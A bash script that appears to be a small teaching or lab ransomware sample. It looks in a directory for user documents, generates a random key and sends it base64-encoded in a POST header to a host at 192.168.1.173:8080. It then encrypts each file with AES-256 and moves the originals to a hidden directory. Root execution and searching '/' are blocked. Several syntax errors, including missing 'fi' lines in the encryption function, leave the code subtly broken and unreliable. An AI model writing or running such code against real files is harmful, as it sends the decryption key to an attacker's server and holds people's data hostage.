#!/usr/bin/env bash

# SANITY AND SAFETY CHECK! 
# Prevent execution as root
# This script should not be run with elevated privileges to 
# avoid unintended system annihilations.

if [[ $EUID -eq 0 ]]; then
   echo "Error: This script should not be run as root (UID 0)." >&2
   echo "Please run it as a regular user." >&2
   exit 1
fi

# Make sure file can be modified
# For each candidate file, we ensure:
# - It exists (-e)
# - It is readable (-r)
# - It is writable (-w) # Corrected typo

check_file() {
    local file_path="$1" # Use a local variable for the argument for clarity

    # Can we see its existence?
    if ! [[ -e "$file_path" ]]; then
        echo -e "\tCouldn't find $file_path."
        return 1
    fi

    # Can we see its contents?
    if ! [[ -r "$file_path" ]]; then
        echo -e "\tNo read access."
        return 1
    else
        echo -e "\tRead access."
    fi

    # Can we change its contents?
    if ! [[ -w "$file_path" ]]; then
        echo -e "\tNo write access."
        return 1
    else
        echo -e "\tWrite access."
    fi

    return 0
}


# Find user file within the specified directory
# Ensure directory exists and we can access it
# Search within accessible directories for user files
# Check file permissions with check_files()

find_files() {
    local -n ref_exposed_files="$2"
    local search_dir="$1"

    # SANITY AND SAFETY CHECK! 
    # Prevent searching in the root directory and limit scope
    if [[ "$search_dir" == "/" ]]; then
        echo "Error: Searching the root directory (/) is not allowed for safety." >&2
        return 1
    fi 

    # Directory exists?
    if ! [[ -d "$search_dir" ]]; then
        echo "Can't find $search_dir." >&2 # Direct errors to stderr
        return 1
    else
        echo "Found $search_dir."
    fi

    # We have permissions?
    if ! [[ -x "$search_dir" && -r "$search_dir" ]]; then
        echo -e "\tCan't access $search_dir (permissions)" >&2 # Direct errors to stderr
        return 1
    else
        echo -e "\tWe can access directory."
    fi

    # Search in directory
    ext_regex='.*\.\(csv\|xlsx\|docx\|rtf\|pdf\|ost\|pst\|zip\|rar\|7z\|png\|txt\)$'
    
    # Use an intermediate array to store files found by find
    local -a found_files=()

    # Workaround due to subsshell preventing changes to the broader variable
    mapfile -d $'\0' -t found_files < <(find "$search_dir" -maxdepth 1 -type f -iregex "$ext_regex" -print0)

    # Now iterate over the collected files
    for file in "${found_files[@]}"; do
        # Remove the leading directory if present, as find might return "./file"
        local base_file=$(basename "$file")
        echo "Found file type associated with users: $base_file. Checking permissions..."
        # Pass the full path to check_file
        if check_file "$file"; then
            ref_exposed_files+=("$(readlink -f "$file")")
            echo -e "\tAccessible. Added to list."
        else
            echo -e "\tInaccessible. Skipping"
        fi
    done
    
    return 0
}

# Generate an actual encryption key from the keying material
# In a weird and questionable way
# Take username, groupname, and path of file, glue together with key material, and hash
# I have no crypto JUSTIFICATION I just want to mix MOAR into the HASH

encrypt_file() {

    # Wierd hash input
    local hash_input
    hash_input="$(stat -c %U:%G "$1")$(readlink -f "$1")$key"

    # Hashing and removing trailing " -" from sha256sum
    local aes_sk
    aes_sk="$(echo -n "$hash_input" | sha256sum | tr -d ' -' )"

    # Print out
    echo -e "FILE $1\n \tSHA256($hash_input)\n \t\t=>AES KEY $aes_sk" 

    # Dpn't delete files
    # Rather, move them to a directory specified in the function call
    if ! [[ -e "$2"]]; then
      mkdir -p "$2"
    
    # Encrypt file; delete the original if successful
    if openssl enc -aes-256-ctr -pass pass:"$aes_sk" -iter 100 -a -in "$1" -out "$1.aes256.100"; then
      mv "$1" "$2" 
    
    # Not really necessary for local variables but eh
    unset hash_input
    unset aes_sk     
}

# Using ref to work with array+functions
declare -a exposed_files

# 32 random bytes of keying material
key=$(openssl rand -hex 32)
echo -e "Generated 256 bits of keying material" # Corrected typo
echo -e "\t =KEY: $key"

# Transmit secret via a header in a POST request; encoding as Base64
# Using the very RFC-conforming "Special-Delivery" header
curl -X POST -H "Special-Delivery: $(printf "%s" "$key" | base64)" "http://192.168.1.173:8080" 2> /dev/null

# Ensure the script is run from a location where rx_dir is created, or provide a full path.
# Example: find_files "$(pwd)/rx_dir" "exposed_files"
find_files "rx_dir" "exposed_files"

# So far - we found all files via find_files(), which calls check_file()
# We now loop over that and encryptthe files. We only need to transfer
# the single secretm the other components (file ownership, path) are less like to change

echo "---------ENCRYPTING---------"
echo ":"
for file in "${exposed_files[@]}"; do
    encrypt_file "$file" ".deleted_files"# Always double-quote variable expansions
done
